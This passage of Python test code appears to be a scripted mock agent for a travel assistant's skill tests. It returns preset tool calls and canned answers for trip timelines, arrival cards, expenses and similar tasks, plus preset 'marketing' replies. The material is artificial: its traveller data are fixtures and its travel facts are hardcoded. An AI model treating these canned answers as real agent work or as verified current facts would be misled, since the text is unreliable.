        return reply("", [tc("browser_click", {"ref": ref or "e1"})])
    after = "\n".join(r for n, _, r in calls if n in ("browser_click", "browser_snapshot"))
    m = re.search(r"TRV-[A-Z0-9]{7}", after)
    if not m and not has("browser_snapshot"):
        return reply("", [tc("browser_snapshot", {})])
    if not m:
        return reply("TRAVEL FAIL: no booking reference after the click: " + after[-800:])
    return reply(f"Booked. Booking reference: {m.group(0)}. {summary}. Confirmation goes to {TRAVELLER['email']}.")


# ---------------------------------------------------------------- the travel-skill suites (tests/skills_common.py)
PAGES = "http://shop.test:8099"


def _subjects(tool_contents):
    out = []
    for t in tool_contents:
        out += re.findall(r'"subject": "([^"]+)"', str(t))
    return list(dict.fromkeys(out))


def _msg_id(text):
    m = re.search(r'"id": "([^"]+)"', str(text))
    return m.group(1) if m else "1"


def _upload_path(sys, goal, ext):
    m = re.search(r"(uploads/[^\s(\"']+\." + ext + ")", sys + "\n" + goal)
    return m.group(1) if m else f"uploads/x.{ext}"


# marketing_shots.py: natural prompts (no test markers in the pictures) with presentable answers
SHOW_TRIP = "What's on my Tokyo trip this week? Check my mail and calendar."
SHOW_CITY = "We're moving to Shanghai for work with two kids. Where do expat families live, and what does rent cost?"
SHOW_SGAC = "Fill in my Singapore arrival card for Sunday's flight."


def travel_skill(goal, sys, msgs, tools_done, n, last_tool, tnames):
    """One scripted agent per skill. Returns None when the goal is not one of these scenarios."""
    if "focused sub-agent" in sys:
        return None
    tc_ = tc
    if goal.startswith(SHOW_TRIP):
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "trip-today"})])
        if n == 1:
            calls = [tc_("gmail_search", {"query": "(flight OR e-ticket OR itinerary) Tokyo newer_than:60d"}),
                     tc_("gmail_search", {"query": "(hotel OR booking OR reservation) Tokyo newer_than:60d"}),
                     tc_("gmail_search", {"query": "(restaurant OR table) Tokyo newer_than:60d"})]
            if "calendar_list_events" in tnames:
                calls.append(tc_("calendar_list_events", {"time_min": "2026-11-18", "time_max": "2026-11-23"}))
            return reply("", calls)
        return reply("Here's your Tokyo trip, **18–22 November**, from your mail and calendar:\n\n"
                     "| Day | Time | What | Ref |\n|---|---|---|---|\n"
                     "| Wed 18 | 10:30 → 18:25 | ✈️ SQ 636 Singapore → Tokyo Haneda | 9QW3PL |\n"
                     "| Wed 18 | 20:00 | 🏨 Hotel Ginza Grand, check-in (3 nights) | 88812345 |\n"
                     "| Thu 19 | 10:00 | 💼 Product review at Sony, Shinagawa | calendar |\n"
                     "| Fri 20 | 19:00 | 🍣 Sushi Hoshizora, Ginza — table for 2 | OT-55812 |\n"
                     "| Sat 21 | 11:00 | 🏨 Check-out, Hotel Ginza Grand | |\n"
                     "| Sun 22 | 11:05 | ✈️ SQ 637 Haneda → Singapore | 9QW3PL |\n\n"
                     "**Needs your attention**\n"
                     "- ⚠️ **No hotel for the night of Sat 21** — you check out on the 21st and fly on the 22nd. Want me to find a room near Haneda?\n"
                     "- 🚆 Haneda → Ginza: Keikyu Line through to Higashi-Ginza, about 35 minutes; tap your Suica.\n"
                     "- 🛡️ I found no travel-insurance email. Delays and lost bags are the most common claims — are you covered?")
    if goal.startswith(SHOW_CITY):
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "shanghai"})])
        if n == 1:
            return reply("", [tc_("market_data", {"symbols": ["USDCNY=X"]})])
        rate = re.search(r"USD/CNY[^0-9]*([0-9]+\.[0-9]+)", str(last_tool))
        r = float(rate.group(1)) if rate else 7.12
        usd = lambda y: f"≈ US${round(y / r / 100) * 100:,.0f}"
        return reply("Where expat families usually live in Shanghai (from the Shanghai guide, checked October 2026):\n\n"
                     "| Area | Why families choose it | Rent per month |\n|---|---|---|\n"
                     f"| **Jinqiao / Biyun** 金桥/碧云, Pudong | Villa compounds next to Concordia and Dulwich; school-bus life | villas ¥30,000+ ({usd(30000)}) |\n"
                     f"| **Gubei / Hongqiao** 古北/虹桥 | Family flats, international and Japanese/Korean schools, near the airport | ¥15,000–30,000 ({usd(15000)}–{usd(30000)[2:]}) |\n"
                     f"| **Former French Concession** (Xuhui / Jing'an) | Leafy, walkable, cafés; older lane houses and art-deco flats | 1-bed ¥8,000–15,000 ({usd(8000)}–{usd(15000)[2:]}) |\n"
                     f"| **Huacao / Xujing** 华漕/徐泾 | Villas near SAS Puxi and WISS, more space for the money | from ¥25,000 ({usd(25000)}) |\n\n"
                     f"Rate used: 1 USD = ¥{r:.2f} (market data, today).\n\n"
                     "**Before you sign**: one month's deposit plus 1–3 months' rent in advance; agents (Lianjia/Beike 贝壳, Ziroom 自如) charge up to a month. "
                     "School places fill early — Shanghai American School, Concordia and Dulwich publish fees of roughly ¥250,000–390,000 a year. "
                     "Want me to remember which area you choose for next time?")
    if "TRIPTODAY" in goal:   # trip-today: mail + calendar in one turn, then the timeline with the gap
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "trip-today"})])
        if n == 1:
            calls = [tc_("gmail_search", {"query": "(flight OR e-ticket OR itinerary) newer_than:60d", "max_results": 30}),
                     tc_("gmail_search", {"query": "(hotel OR booking OR reservation) newer_than:60d", "max_results": 30}),
                     tc_("gmail_search", {"query": "(restaurant OR table) newer_than:60d", "max_results": 30})]
            if "calendar_list_events" in tnames:
                calls.append(tc_("calendar_list_events", {"time_min": "2026-11-18", "time_max": "2026-11-26"}))
            return reply("", calls)
        subs = _subjects(m["content"] for m in tools_done)
        return reply("TRIP TIMELINE (from your mail and calendar):\n" + "\n".join(f"- {x}" for x in subs) +
                     "\n\nGAP: no hotel for the night of 2026-11-23 (Hotel Ginza Grand checks out 23 Nov, SQ 637 flies 24 Nov).\n"
                     "Insurance: no travel insurance email was found — delays and lost luggage are common claims; are you covered?")
    if "SGAC" in goal or goal.startswith(SHOW_SGAC):   # sg-arrival-card: gather, fill, hand the Submit to the user (or click it when told to)
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "sg-arrival-card"})])
        if n == 1:
            return reply("", [tc_("gmail_search", {"query": "(Singapore OR SIN OR Changi) (flight OR e-ticket) newer_than:60d"}),
                              tc_("gmail_search", {"query": "(hotel OR booking) Singapore newer_than:60d"})])
        if n == 3:
            return reply("", [tc_("profile_get", {"fields": ["name_en", "birthday", "nationality", "email_personal", "phone"]})])
        if n == 4:
            return reply("", [tc_("vault_list", {})])
        if n == 5:
            return reply("", [tc_("browser_navigate", {"url": PAGES + "/sgac.html"})])
        if n == 6:
            page = last_tool
            vals = [("Full name", "LUCAS LU"), ("Date of birth", "1985-04-12"), ("Nationality", "Australia"),
                    ("Arrival flight", "SQ 231"), ("Arrival date", (re.search(r"SQ 231 SYD-SIN (20\d\d-\d\d-\d\d)", str(tools_done[1]["content"])) or re.search(r"(20\d\d-\d\d-\d\d)", "x 2026-11-02")).group(1)),
                    ("Accommodation", "Marina Bayfront Hotel")]
            return reply("", [tc_("browser_type", {"ref": _snap_ref(page, lab) or "e1", "text": v}) for lab, v in vals])
        if n == 12:
            vid = re.search(r"id=(vlt_\w+) · Passport", str(tools_done[4]["content"]))
            page = tools_done[5]["content"]
            return reply("", [tc_("browser_fill_secret", {"ref": _snap_ref(page, "Passport number") or "e4", "item_id": vid.group(1) if vid else "x", "field": "number"})])
        if n == 13:
            if "submit it for me without review" in goal:
                return reply("", [tc_("browser_click", {"ref": _snap_ref(tools_done[5]["content"], "Submit declaration", role="button") or "e12"})])
            return reply("", [tc_("browser_request_takeover", {"reason": "Review the SG Arrival Card and press Submit yourself; hand the browser back when the DE number shows"})])
        if n == 14 and "submit it for me without review" not in goal:
            return reply("", [tc_("browser_snapshot", {})])
        de = re.search(r"DE\d{12}", "\n".join(str(m["content"]) for m in tools_done[13:]))
        if de:
            if not any(c["function"]["name"] == "memory_remember" for m in msgs if m.get("role") == "assistant" for c in (m.get("tool_calls") or [])):
                return reply("", [tc_("memory_remember", {"fact": "SG Arrival Card filed for the Nov 2026 Singapore trip", "domain": "place"})])
            return reply(f"FILED. DE Number: {de.group(0)} for LUCAS LU, arriving on SQ 231. Show your passport at the checkpoint; ICA emails an acknowledgement.")
        return reply("NOT SUBMITTED: the SG Arrival Card is still open with every field filled (LUCAS LU · 1985-04-12 · Australia · SQ 231 · "
                     "Marina Bayfront Hotel · passport from the vault). Press Submit in the browser tab when you are ready, or ask me again.")
    if "ENTRYREQ" in goal:   # entry-requirements: official pages read, reminder set
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "entry-requirements"})])
        if n == 1:
            return reply("", [tc_("profile_get", {"fields": ["nationality"]})])
        if n == 2:
            return reply("", [tc_("browser_read", {"urls": [PAGES + "/tdac.html", PAGES + "/sgac.html"]})])
        if n == 3:
            return reply("", [tc_("schedule_create", {"name": "File the Thailand TDAC", "goal": "Remind me to file the TDAC at tdac.immigration.go.th (within 3 days before arrival)",
                                                       "kind": "cron", "spec": "0 9 * * *"})])
        return reply("| Destination | Requirement | When | Status | Official link | Date checked |\n|---|---|---|---|---|---|\n"
                     "| Thailand | TDAC digital arrival card | within 3 days before arrival | reminder set | tdac.immigration.go.th | 2026-10-25 |\n"
                     "| Singapore | SG Arrival Card + health declaration | within 3 days before arrival | I can fill it (sg-arrival-card) | eservices.ica.gov.sg | 2026-10-25 |\n"
                     "Passport: at least 6 months validity for Thailand (page read today).")
    if "FLIGHTDELAY" in goal:   # flight-disruption: status page, alternatives from the connector, insurance, a watch
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "flight-disruption"})])
        if n == 1:
            return reply("", [tc_("gmail_search", {"query": "(SQ 638 OR Singapore Airlines) (e-ticket OR itinerary) newer_than:60d"}),
                              tc_("gmail_search", {"query": "insurance (policy OR certificate OR travel) newer_than:365d"})])
        if n == 3:
            return reply("", [tc_("browser_read", {"urls": [PAGES + "/flightstatus.html"]})])
        if n == 4:
            return reply("", [tc_("watch_create", {"name": "SQ 638 status", "url": PAGES + "/flightstatus.html", "mode": "change", "every_minutes": 15})])
        if n == 5 and any(t.startswith("mcp_") and t.endswith("flights_search") for t in tnames):
            tool = next(t for t in tnames if t.startswith("mcp_") and t.endswith("flights_search"))
            return reply("", [tc_(tool, {"origin": "SIN", "destination": "Tokyo", "date": goal.split("DATE=")[-1][:10] if "DATE=" in goal else "2026-11-20", "adults": 1})])
        est = re.search(r"Estimated[^0-9]*(\d\d:\d\d)", "\n".join(str(m["content"]) for m in tools_done))
        alt = re.search(r'\\?"title\\?": \\?"([^"\\]+)', str(tools_done[5]["content"]) if len(tools_done) > 5 else "")
        pol = re.search(r"TI-\d{4}-\d+", "\n".join(str(m["content"]) for m in tools_done))
        return reply(f"SQ 638 is delayed: estimated departure {est.group(1) if est else '?'} (scheduled 09:25), late inbound aircraft.\n"
                     f"Alternatives today (connector): {alt.group(1) if alt else 'none found'}.\n"
                     f"Insurance: policy {pol.group(0) if pol else 'not found'} pays a delay benefit per 6 hours — ask the airline for a delay "
                     f"certificate and keep boarding passes and receipts.\nI set a watch on the status page and will notify you on any change.")
    if "BAGLOST" in goal:   # baggage-delayed-lost
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "baggage-delayed-lost"})])
        if n == 1:
            return reply("", [tc_("gmail_search", {"query": "insurance (policy OR certificate OR travel) newer_than:365d"})])
        if n == 2:
            return reply("", [tc_("browser_read", {"urls": [PAGES + "/bagtrace.html"]})])
        if n == 3:
            return reply("", [tc_("gmail_create_draft", {"to": "baggage@singaporeair.example", "subject": "Delayed baggage SINSQ12345 — expenses claim",
                                                          "body": "File SINSQ12345, flight SQ 638 of 20 Nov 2026, bag tag SQ 123456. Receipts for essentials attached. Delivery: Hotel Ginza Grand."})])
        if n == 4:
            return reply("", [tc_("schedule_create", {"name": "Check baggage file SINSQ12345", "goal": "Read " + PAGES + "/bagtrace.html and notify me if the status changes",
                                                       "kind": "cron", "spec": "0 9,18 * * *"})])
        st = re.search(r"Status: (?:<b>)?([^.<]+)", "\n".join(str(m["content"]) for m in tools_done))
        return reply(f"Bag file SINSQ12345: {st.group(1).strip() if st else 'status unknown'}. Keep receipts for essentials; a bag not found within 21 days "
                     f"is treated as lost (Montreal Convention limits apply). I drafted the expenses claim to the airline and will check the file twice a day. "
                     f"Your policy's baggage-delay benefit needs the PIR and receipts.")
    if "EXPENSES" in goal:   # travel-expense-report: receipt photo (vision), statement CSV, mail receipts, files
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "travel-expense-report"})])
        if n == 1:
            return reply("", [tc_("file_look", {"path": _upload_path(sys, goal, "png"),
                                                "question": "Return a JSON object {merchant, address, date, time, currency, total, subtotal, tax, service_charge, tip, payment_method, card_last4, items, receipt_no, language, notes} exactly as printed."})])
        if n == 2:
            return reply("", [tc_("data_query", {"path": _upload_path(sys, goal, "csv")})])
        if n == 3:
            return reply("", [tc_("gmail_find_receipts", {"senders": ["agoda.com"], "days": 60})])
        if n == 4:
            return reply("", [tc_("calculate", {"expression": "18000 + 78000"})])
        if n == 5:
            return reply("", [tc_("make_xlsx", {"output": "expenses/tokyo-expenses.xlsx", "sheets": [
                {"name": "Lines", "columns": ["date", "merchant", "category", "amount", "currency", "evidence"],
                 "rows": [["2026-11-20", "Sushi Hoshizora", "meals", 18000, "JPY", "receipt R-7781 (photo) = statement row"],
                          ["2026-11-21", "Agoda — Hotel Ginza Grand", "lodging", 78000, "JPY", "Agoda receipt email = statement row"]]},
                {"name": "Summary", "columns": ["category", "JPY"], "rows": [["meals", 18000], ["lodging", 78000], ["total", 96000]]}]})])
        if n == 6:
            return reply("", [tc_("make_pdf", {"markdown": "# Reimbursement request — Tokyo trip\n\n| Category | JPY |\n|---|---|\n| Meals | 18,000 |\n| Lodging | 78,000 |\n| **Total** | **96,000** |\n\nEvidence: receipt R-7781 (photo), Agoda receipt email, card statement rows.",
                                               "output": "expenses/tokyo-claim.pdf"})])
        if n == 7:
            return reply("", [tc_("send_file", {"paths": ["expenses/tokyo-expenses.xlsx", "expenses/tokyo-claim.pdf"]})])
        return reply("EXPENSE REPORT — Tokyo trip\n\n| Category | JPY |\n|---|---|\n| Meals (Sushi Hoshizora, receipt R-7781) | 18,000 |\n"
                     "| Lodging (Agoda, Hotel Ginza Grand) | 78,000 |\n| **Total** | **96,000 JPY** |\n\nBoth lines match the card statement; "
                     "no statement row is without a receipt. Files: expenses/tokyo-expenses.xlsx, expenses/tokyo-claim.pdf.")
    if "PAYASIA" in goal:   # payments-connectivity-asia: rates from market data, no browser
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "payments-connectivity-asia"})])
        if n == 1:
            return reply("", [tc_("market_data", {"symbols": ["SGDJPY=X", "SGDCNY=X"]})])
        rate = re.search(r"SGD/JPY[^0-9]*([0-9.]+)", last_tool)
        return reply(f"Tokyo: cards work in most places but carry cash for small restaurants; get a Welcome Suica (28 days, no deposit) or Mobile Suica; "
                     f"1 SGD = {rate.group(1) if rate else '?'} JPY (market data just now). Shanghai: set up Alipay or WeChat Pay with your foreign card before "
                     f"you leave (the SMS code is the step that fails); Didi for taxis. Connectivity: an eSIM installed at home; roaming eSIMs route around the "
                     f"blocked sites in mainland China. Decline dynamic currency conversion everywhere.")
    if "GETAROUND" in goal:   # getting-around-asia: the operator's timetable page, read not clicked
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "getting-around-asia"})])
        if n == 1:
            return reply("", [tc_("browser_read", {"urls": [PAGES + "/timetable.html"]})])
        fare = re.search(r"¥[\d,]+", last_tool)
        dep = re.search(r"(\d\d:\d\d)", last_tool)
        return reply(f"| Option | Dep | Arr Tokyo | Fare |\n|---|---|---|---|\n| Narita Express 7 | {dep.group(1) if dep else '?'} | 08:41 | {fare.group(0) if fare else '?'} |\n"
                     f"| Keisei Skyliner (to Ueno) | 07:50 | 08:31 | ¥2,580 |\n\nWith two big suitcases take the Narita Express (reserved seats, luggage racks); "
                     f"buy at the JR counter or machine on arrival. Timetable read from the operator's page today.")
    if "TAXREFUND" in goal:   # tax-refund-shopping: the official rule page, a departure-day reminder
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "tax-refund-shopping"})])
        if n == 1:
            return reply("", [tc_("browser_read", {"urls": [PAGES + "/taxfree.html"]})])
        if n == 2:
            return reply("", [tc_("schedule_create", {"name": "Tax refund before check-in", "goal": "Remind me: tax-free terminal at the airport before checking in luggage, receipts and goods in hand",
                                                       "kind": "cron", "spec": "0 7 * * *"})])
        return reply("From 1 November 2026 you pay the full price in the shop and get the refund at departure: scan your passport at the tax-free "
                     "terminal before checking in luggage; goods bought within 90 days qualify and every item on a receipt must be present. "
                     "I set a departure-day reminder. (Rule page read today, 2026-10-25.)")
    if "LOSTPASSPORT" in goal:   # travel-health-emergency
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "travel-health-emergency"})])
        if n == 1:
            return reply("", [tc_("gmail_search", {"query": "insurance (policy OR certificate OR travel OR assistance) newer_than:365d"})])
        if n == 2:
            return reply("", [tc_("browser_read", {"urls": [PAGES + "/embassy.html"]})])
        if n == 3:
            return reply("", [tc_("memory_search", {"query": "passport copy"})])
        emb = re.search(r"\+81[\d ]+", str(tools_done[2]["content"]))
        hot = re.search(r"\+65[\d ]+", str(tools_done[1]["content"]))
        return reply(f"1. Police report at the nearest kōban (needed for the embassy and the insurer).\n2. Embassy consular section, Mon–Fri 09:00–12:00: "
                     f"bring the police report, two photos, a copy of the passport, your flight booking; emergency line {emb.group(0).strip() if emb else 'see the embassy page'}; "
                     f"emergency passports take about 2 working days.\n3. Call your insurer's 24-hour assistance line {hot.group(0).strip() if hot else '(not found in mail)'} — "
                     f"extra nights and the new ticket may be covered.\n4. I found no passport copy in your files; the embassy accepts other ID plus the flight booking.")
    if "HOTELREQ" in goal:   # hotel-requests
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "hotel-requests"})])
        if n == 1:
            return reply("", [tc_("gmail_search", {"query": "(hotel OR booking OR reservation) Ginza newer_than:90d"})])
        if n == 2:
            return reply("", [tc_("gmail_get_message", {"message_id": _msg_id(last_tool)})])
        if n == 3:
            return reply("", [tc_("gmail_create_draft", {"to": "reservations@ginzagrand.example", "subject": "Early check-in request — confirmation 88812345",
                                                          "body": "Dear Hotel Ginza Grand, I arrive on 20 Nov 2026 around 11:00 (confirmation 88812345, Lucas Lu). Could an early check-in be arranged, or luggage storage if the room is not ready? Thank you."})])
        dl = re.search(r"[Ff]ree cancellation until ([^.;\n\"]+)", str(tools_done[2]["content"]) if len(tools_done) > 2 else "")
        return reply(f"Booking 88812345 at Hotel Ginza Grand, 20–23 Nov 2026. Free cancellation until {dl.group(1).strip() if dl else 'not found in the mail'}. "
                     f"I drafted the early check-in request to the hotel — send it from your drafts.")
    if "WHICHCARD" in goal:   # credit-card-picker: profile cards + the catalog table, maths with calculate, no browser
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "credit-card-picker"})])
        if n == 1:
            return reply("", [tc_("profile_get", {"fields": ["custom:credit cards", "custom:card market"]})])
        if n == 2:
            return reply("", [tc_("load_skill", {"name": "credit-card-picker", "file": "cards/us.md"})])
        if n == 3:
            return reply("", [tc_("calculate", {"expression": "300 * 3 * 0.01, 300 * 0.02"})])
        table = str(tools_done[2]["content"])
        csr = re.search(r"\| Chase \| Sapphire Reserve[^\n]*", table)
        rate = re.search(r"dining (\d+(?:\.\d+)?)x", csr.group(0)) if csr else None
        ver = re.search(r"\| (\d{4}-\d\d-\d\d) \|", csr.group(0)) if csr else None
        return reply(f"| Card | Rate | Value | Caveat |\n|---|---|---|---|\n| Chase Sapphire Reserve | dining {rate.group(1) if rate else '?'}x | USD 9.00 | points at 1¢ |\n"
                     f"| Citi Double Cash | 2% cashback | USD 6.00 | — |\n\nUse the **Chase Sapphire Reserve** for the USD 300 dinner: "
                     f"{rate.group(1) if rate else '?'}x on dining beats 2% cash back (9.00 vs 6.00, computed). Catalog verified {ver.group(1) if ver else '?'}; terms change.")
    if "EUETIAS" in goal:   # eu-etias: nothing to file today, read the official status page
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "eu-etias"})])
        if n == 1:
            return reply("", [tc_("browser_read", {"urls": [PAGES + "/etias_status.html"]})])
        live = "not yet in operation" in last_tool
        return reply("ETIAS is not in operation today (official page read 2026-10-25): nothing to apply for, and any site selling it is a scam. "
                     "At the border the EES registers your fingerprints and face automatically. I will fill the application once it opens."
                     if live else "ETIAS status unclear — check the official page.")
    if "ARRCARD " in goal:   # one generic flow for every per-country arrival-card skill: gather, fill, stop before Submit
        skill = re.search(r"ARRCARD (\S+)", goal).group(1)
        if n == 0:
            return reply("", [tc_("load_skill", {"name": skill})])
        if n == 1:
            return reply("", [tc_("gmail_search", {"query": "(flight OR e-ticket OR itinerary) newer_than:60d"}),
                              tc_("gmail_search", {"query": "(hotel OR booking OR reservation) newer_than:60d"})])
        if n == 3:
            return reply("", [tc_("profile_get", {"fields": ["name_en", "birthday", "nationality", "email_personal", "phone"]})])
        if n == 4:
            return reply("", [tc_("vault_list", {})])
        if n == 5:
            return reply("", [tc_("browser_navigate", {"url": PAGES + "/arrival_form.html"})])
        if n == 6:
            page = last_tool
            vals = [("Full name", "LUCAS LU"), ("Date of birth", "1985-04-12"), ("Nationality", "Australia"),
                    ("Arrival flight", "SQ 231"), ("Accommodation", "Test Hotel")]
            return reply("", [tc_("browser_type", {"ref": _snap_ref(page, lab) or "e1", "text": v}) for lab, v in vals])
        if n == 11:
            vid = re.search(r"id=(vlt_\w+) · Passport", str(tools_done[4]["content"]))
            page = tools_done[5]["content"]
            return reply("", [tc_("browser_fill_secret", {"ref": _snap_ref(page, "Passport number") or "e4", "item_id": vid.group(1) if vid else "x", "field": "number"})])
        if n == 12:
            extra = ", take the photo and pay the fee" if skill == "uk-eta" else ""
            return reply("", [tc_("browser_request_takeover", {"reason": f"Review the form{extra} and press Submit yourself; hand the browser back when the confirmation shows"})])
        if n == 13:
            return reply("", [tc_("browser_snapshot", {})])
        ref = re.search(r"AC-\d{4}-\d{6}", "\n".join(str(m["content"]) for m in tools_done[12:]))
        if ref:
            return reply(f"FILED ({skill}). Reference {ref.group(0)}; a confirmation has been emailed.")
        return reply(f"NOT SUBMITTED ({skill}): the form is still open with every field filled (LUCAS LU · 1985-04-12 · Australia · SQ 231 · Test Hotel · "
                     "passport from the vault). Press Submit in the browser tab when you are ready, or ask me again.")
    if "CITYLIFT" in goal:   # city_guides_e2e.py: a booking skill loaded after a guide brings the browser back
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "tokyo"})])
        if n == 1:
            CITYLIFT["after_guide"] = any(x.startswith("browser_") for x in tnames)
            return reply("", [tc_("load_skill", {"name": "restaurant-booking"})])
        return reply(f"LIFT after_guide={CITYLIFT.get('after_guide')} after_booking={any(x.startswith('browser_') for x in tnames)}")
    if "CITYGUIDE " in goal:   # city_guides_e2e.py: the guide answers from its own sheet + market_data, no browser
        skill, sym = re.search(r"CITYGUIDE (\S+) (\S+)", goal).groups()
        if n == 0:
            return reply("", [tc_("load_skill", {"name": skill})])
        if n == 1:
            if any(x.startswith("browser_") for x in tnames) or "delegate" in tnames:
                return reply("CITY FAIL: browser tools or delegate still offered after the guide was loaded")
            calls = [tc_("market_data", {"symbols": [sym]})]
            if "TRYBROWSER" in goal:   # a model that calls the browser anyway: the runtime must refuse it
                calls.append(tc_("browser_search", {"query": "tokyo subway fare"}))
            return reply("", calls)
        sheet = str(tools_done[0]["content"])
        line = next((l.strip() for l in sheet.split("## Getting around", 1)[-1].splitlines() if l.strip().startswith("- ")), "")
        rate = re.search(re.escape(f"{sym[:3]}/{sym[3:6]}") + r"[^0-9]*([0-9][0-9,]*\.[0-9]+)", str(tools_done[1]["content"]))
        return reply(f"CITY ANSWER ({skill}). Getting around: {line[2:200]} | FX {sym}: {rate.group(1) if rate else '?'}")
    if "IMAGEGEN" in goal:   # imagegen_e2e.py: one picture, then an edit of it
        if n == 0:
            return reply("", [tc_("make_image", {"prompt": "a red fox in fresh snow, watercolour"})])
        if n == 1:
            return reply("", [tc_("edit_image", {"prompt": "add a blue scarf to the fox"})])
        return reply("IMAGES DONE: " + str(last_tool)[:200])
    if "ARRNOMAIL" in goal:   # arrival_nomail_e2e.py: no mailbox — ask once, an uploaded e-ticket, or "I'll fill it in myself"
        def find(rx):
            m = re.search(rx, "\n".join(str(x["content"]) for x in tools_done))
            return m.group(1) if m else None
        form = next((str(x["content"]) for x in tools_done if "Passport number" in str(x["content"])), "")
        if any(x.startswith("gmail_") for x in tnames):
            return reply("ARRNOMAIL FAIL: a mailbox is connected")
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "th-arrival-card"})])
        ident = [tc_("profile_get", {"fields": ["name_en", "birthday", "nationality", "email_personal", "phone"]}), tc_("vault_list", {})]
        if "ARRNOMAIL ask" in goal:
            if n == 1:
                calls = [tc_("memory_search", {"query": "trip Thailand flight hotel"})] + ident
                if "calendar_list_events" in tnames:
                    calls.insert(0, tc_("calendar_list_events", {"time_min": "2026-10-25", "time_max": "2026-12-31"}))
                return reply("", calls)
            return reply("WAITING FOR DATA (th-arrival-card): your name, birthday, nationality and passport are ready from your profile and vault. "
                         "Which flight do you arrive on (number and date)? Where are you staying (hotel name or address)? "
                         "Or upload the e-ticket / booking confirmation. Connecting a mailbox (Settings → Connections) lets me find bookings myself next time.")
        myself = "ARRNOMAIL myself" in goal
        if "ARRNOMAIL eticket" in goal:
            ident = [tc_("file_look", {"path": _upload_path(sys, goal, "png"), "question": "Read this e-ticket / booking confirmation: flight number, date, origin, onward flight, hotel name and address."})] + ident
        start = len(ident) + 1   # turn index after the gathering turn
        flight = find(r"(SQ \d+)[^\n]*Bangkok") or (re.search(r"(SQ \d+)", goal).group(1) if re.search(r"SQ \d+", goal) else None)
        hotel = find(r"Hotel on the itinerary: ([^,]+)") or (re.search(r"staying at ([^.,]+)", goal).group(1) if "staying at" in goal else None)
        if n == 1:
            return reply("", ident)
        steps = [] if myself else [tc_("memory_remember", {"fact": f"Trip Thailand 2026-11-02: {flight}, staying at {hotel}", "domain": "place"})]
        steps.append(tc_("browser_navigate", {"url": PAGES + "/arrival_form.html"}))
        at = start
        for s in steps:
            if n == at:
                return reply("", [s])
            at += 1
        vals = [("Full name", "LUCAS LU"), ("Date of birth", "1985-04-12"), ("Nationality", "Australia")]
        if not myself:
            vals += [("Arrival flight", flight), ("Accommodation", hotel)]
        if n == at:
            return reply("", [tc_("browser_type", {"ref": _snap_ref(form, lab) or "e1", "text": v}) for lab, v in vals])
        at += len(vals)
        if n == at:
            vid = find(r"id=(vlt_\w+) · Passport")
            return reply("", [tc_("browser_fill_secret", {"ref": _snap_ref(form, "Passport number") or "e4", "item_id": vid or "x", "field": "number"})])
        if n == at + 1:
            why = ("Fill in the flight and accommodation, review the form and press Submit yourself; hand the browser back when the confirmation shows"
                   if myself else "Review the form and press Submit yourself; hand the browser back when the confirmation shows")
            return reply("", [tc_("browser_request_takeover", {"reason": why})])
        if n == at + 2:
            return reply("", [tc_("browser_snapshot", {})])
        what = "LUCAS LU · 1985-04-12 · Australia · passport from the vault" + ("" if myself else f" · {flight} · {hotel}")
        return reply(f"NOT SUBMITTED (th-arrival-card): the form is still open with {what}. Press Submit in the browser tab when you are ready, or ask me again.")
    if "DIETARY" in goal:   # dining-dietary-translate
        if n == 0:
            return reply("", [tc_("load_skill", {"name": "dining-dietary-translate"})])
        if n == 1:
            return reply("", [tc_("file_look", {"path": _upload_path(sys, goal, "png"), "question": "Transcribe this menu and translate it to English; flag items containing peanuts."})])
        if n == 2:
            return reply("", [tc_("profile_suggest", {"field": "custom:allergies", "value": "peanut (severe)", "reason": "told me when asking for a dietary card"})])
        flagged = re.search(r"([^\s;]+) Tantanmen[^;]*peanut", last_tool if n == 2 else str(tools_done[1]["content"]))
        return reply("Your card (Japanese):\n私は重度のピーナッツアレルギーがあります。微量でも危険です。ソースや調理油にピーナッツが含まれていないか確認してください。"
                     "ピーナッツ以外は何でも食べられます。ありがとうございます。\n(Watashi wa jūdo no pīnattsu arerugī ga arimasu…)\n\n"
                     f"Menu check: avoid {flagged.group(1) if flagged else '担々麺'} (tantanmen — peanut sauce); 塩ラーメン and 餃子 do not list peanuts, but ask the kitchen. "
                     "I noted the allergy in your profile for next time (confirm it on the Memory page).")
    return None
